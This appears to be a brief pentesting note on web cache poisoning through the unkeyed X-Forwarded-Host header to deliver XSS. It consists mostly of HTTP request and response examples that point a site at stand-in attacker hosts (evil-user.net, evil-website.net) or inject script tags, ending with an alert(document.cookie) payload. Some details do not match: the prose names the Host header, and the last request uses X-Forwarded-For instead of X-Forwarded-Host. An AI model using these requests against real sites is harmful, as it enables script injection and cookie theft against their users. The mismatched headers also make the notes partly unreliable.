# Delivering XSS Attack

Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as external JavaScript files.&#x20;

Here is an example:

```http
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

We can change the "Host" header to a URL we can control and poison the web cache.



We can also poison with a response containing a simple XSS payload:

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```



_**Adding an X-Forwarded-Host Header:**_

```http
GET /resources/js/tracking.js HTTP/2
Host: innocent-website.net
Cookie: session=DRBlOrdc4jiQIO1TYTgx9Hn9iqRmYWFa
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Forwarded-For: evil-website.net
```

_**evil-website.net/resource/js/tracking.js:**_

```
alert(document.cookie)
```
